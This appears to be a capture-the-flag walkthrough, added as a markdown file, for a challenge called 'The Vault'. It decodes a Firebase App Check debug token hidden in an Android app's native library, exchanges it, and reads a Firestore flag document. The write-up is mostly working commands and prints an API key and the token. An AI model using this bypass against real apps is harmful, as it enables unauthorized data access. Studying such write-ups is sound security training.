@@ -1,0 +1,244 @@
+---
+title: "[ 03 ] THE VAULT"
+description: "Walkthrough for The Vault"
+---
+
+---
+
+## Flag
+---
+
+```text Output
+FAM{4pp_ch3ck_byp4ss_g00d_j0b}
+```
+
+## Challenge Summary
+---
+
+Prompt:
+
+```text Output
+The vault trusts no one it hasn't met. But the app already made introductions. Something in the code proves who you are.
+
+hint: the token is hiding in plain sight
+```
+
+This challenge reused the Android APK. The hint pointed at a token embedded in the app. The relevant protection was Firebase App Check using a debug token.
+
+## Recon From The APK
+---
+
+I searched for token-related strings:
+
+```powershell Terminal
+python -c "import zipfile,re; z=zipfile.ZipFile('fam-ctf (1).apk'); terms=[b'token',b'Token',b'signature',b'Signature',b'debug',b'Debug',b'vault',b'proof',b'auth',b'Bearer',b'custom',b'claim',b'uid',b'user'];\
+for n in z.namelist():\
+ if n.endswith(('.dex','.so','.arsc','.xml')):\
+  b=z.read(n);\
+  if any(t in b for t in terms):\
+   print('---',n);\
+   for m in re.finditer(rb'[ -~]{4,}', b):\
+    s=m.group(); low=s.lower();\
+    if any(t.lower() in low for t in terms): print(s.decode('latin1','ignore')[:500])"
+```
+
+Useful strings in `classes3.dex`:
+
+```text Output
+DebugTokenAppCheckProvider.kt
+:exchangeDebugToken
+debugToken
+debug_token
+FirebaseAppCheck
+getDebugToken
+flags
+flag3
+```
+
+Why: `DebugTokenAppCheckProvider` and `exchangeDebugToken` directly indicate Firebase App Check debug token exchange.
+
+## Decompiling Enough DEX To Find The Firestore Path
+---
+
+I installed androguard and dumped app classes:
+
+```powershell Terminal
+python -m pip install androguard -q
+```
+
+Then listed app-owned classes:
+
+```powershell Terminal
+python -c "from androguard.core.dex import DEX; import zipfile; d=DEX(zipfile.ZipFile('fam-ctf (1).apk').read('classes3.dex')); print('\n'.join(c.name for c in d.get_classes() if 'ctf/fam' in c.name))"
+```
+
+Important classes:
+
+```text Output
+Lcom/ctf/fam/DebugTokenAppCheckProvider;
+Lcom/ctf/fam/MainActivity;
+Lcom/ctf/fam/MainActivity$verifyFlag3$1;
+```
+
+I dumped method instructions and searched for `verifyFlag3`:
+
+```powershell Terminal
+python -c "from androguard.core.dex import DEX; import zipfile,logging; logging.getLogger().setLevel(logging.CRITICAL); d=DEX(zipfile.ZipFile('fam-ctf (1).apk').read('classes3.dex')); \
+for cls in d.get_classes():\
+    name=cls.name;\
+    if name.startswith('Lcom/ctf/fam/MainActivity') or name.startswith('Lcom/ctf/fam/DebugToken'):\
+        print('\\nCLASS',name);\
+        for m in cls.get_methods():\
+            print('\\nMETHOD',m.get_name(),m.get_descriptor());\
+            code=m.get_code();\
+            if code:\
+                [print('  %-22s %s'%(ins.get_name(), ins.get_output())) for ins in code.get_bc().get_instructions()]"
+```
+
+Key bytecode:
+
+```text Output
+METHOD verifyFlag3 ()V
+invoke-static FirebaseFirestore->getInstance()
+const-string "flags"
+collection("flags")
+const-string "flag3"
+document("flag3")
+get()
+```
+
+Why: this showed the target is Firestore document `flags/flag3`.
+
+## Extracting The Hidden Debug Token
+---
+
+Native exports showed a dedicated method:
+
+```powershell Terminal
+wsl -e sh -lc "readelf -Ws extracted/lib/x86_64/libfam.so | grep Java_com_ctf_fam"
+```
+
+Important exports:
+
+```text Output
+Java_com_ctf_fam_MainActivity_getDebugToken
+Java_com_ctf_fam_MainActivity_computeSignature
+Java_com_ctf_fam_MainActivity_getUsernames
+```
+
+I disassembled `getDebugToken`:
+
+```powershell Terminal
+wsl -e sh -lc "objdump -d -M intel extracted/lib/x86_64/libfam.so | grep -A80 -B10 'Java_com_ctf_fam_MainActivity_getDebugToken'"
+```
+
+The function:
+
+- reserves a 36-byte output string
+- uses a 19-byte key from `.rodata`
+- XORs key bytes with `0xaa`
+- XORs that stream against another `.rodata` byte array
+
+I decoded it directly:
+
+```powershell Terminal
+python -c "key=bytes.fromhex('ecebe7f5d999c9d899def5c199d3f5989a989c'); data=bytes.fromhex('7e077a69460654361e356c5e72546b7005031b7f75096b5e775336754d672f04401d0705'); out=bytes([data[i]^((key[i%19]^0xaa)&0xff) for i in range(36)]); print(out.decode())"
+```
+
+Output:
+
+```text Output
+8F76557D-A35A-4B51-94D4-D0DF98D79B55
+```
+
+Why: this is the Firebase App Check debug token.
+
+## Exchanging The Debug Token For An App Check Token
+---
+
+I used the Firebase App Check exchange endpoint:
+
+```powershell Terminal
+$api='AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww'
+$project='674578159678'
+$app='1:674578159678:android:775058d15777caf841996f'
+$debug='8F76557D-A35A-4B51-94D4-D0DF98D79B55'
+$url="https://firebaseappcheck.googleapis.com/v1/projects/$project/apps/$app`:exchangeDebugToken"
+$body=@{debugToken=$debug} | ConvertTo-Json
+$r=Invoke-RestMethod -Method Post `
+  -Uri $url `
+  -Headers @{'X-Goog-Api-Key'=$api} `
+  -ContentType 'application/json' `
+  -Body $body
+$r | ConvertTo-Json -Depth 5
+```
+
+Why: Firestore security rules can require a valid App Check token in addition to Firebase Auth.
+
+## Querying Firestore
+---
+
+I combined:
+
+- Firebase anonymous auth `idToken`
+- Firebase App Check token
+- Firestore REST API
+
+Command:
+
+```powershell Terminal
+$api='AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww'
+$debug='8F76557D-A35A-4B51-94D4-D0DF98D79B55'
+$project='674578159678'
+$app='1:674578159678:android:775058d15777caf841996f'
+$appcheck=(Invoke-RestMethod -Method Post `
+  -Uri "https://firebaseappcheck.googleapis.com/v1/projects/$project/apps/$app`:exchangeDebugToken" `
+  -Headers @{'X-Goog-Api-Key'=$api} `
+  -ContentType 'application/json' `
+  -Body (@{debugToken=$debug}|ConvertTo-Json)).token
+$auth=(Invoke-RestMethod -Method Post `
+  -Uri "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$api" `
+  -ContentType 'application/json' `
+  -Body '{"returnSecureToken":true}').idToken
+
+$u="https://firestore.googleapis.com/v1/projects/fam-ctf/databases/(default)/documents/flags/flag3?key=$api"
+Invoke-WebRequest -UseBasicParsing `
+  -Uri $u `
+  -Headers @{Authorization="Bearer $auth";'X-Firebase-AppCheck'=$appcheck}
+```
+
+Output:
+
+```json Data.json
+{
+  "name": "projects/fam-ctf/databases/(default)/documents/flags/flag3",
+  "fields": {
+    "value": {
+      "stringValue": "FAM{4pp_ch3ck_byp4ss_g00d_j0b}"
+    }
+  }
+}
+```
+
+## Why This Worked
+---
+
+The app shipped a Firebase App Check debug token. Debug tokens are meant for development builds but were accepted by the production Firebase App Check configuration. Once exchanged, the token satisfied the App Check gate.
+
+## Other Methods That Could Have Worked
+---
+
+- Run the APK and watch Firebase App Check exchange traffic in a proxy.
+- Use Frida to hook `getDebugToken()` or Firebase App Check provider methods.
+- Use jadx to decompile the Kotlin code directly, then inspect `DebugTokenAppCheckProvider.kt`.
+- Patch the APK to print the debug token in the UI or logcat.
+
+## High-Level Solve Path
+---
+
+1. Search DEX/native strings for token/App Check indicators.
+2. Identify `DebugTokenAppCheckProvider` and `getDebugToken`.
+3. Reverse the native XOR decoding routine.
+4. Exchange the debug token for an App Check JWT.
+5. Query Firestore document `flags/flag3`.
+6. Recover the flag.
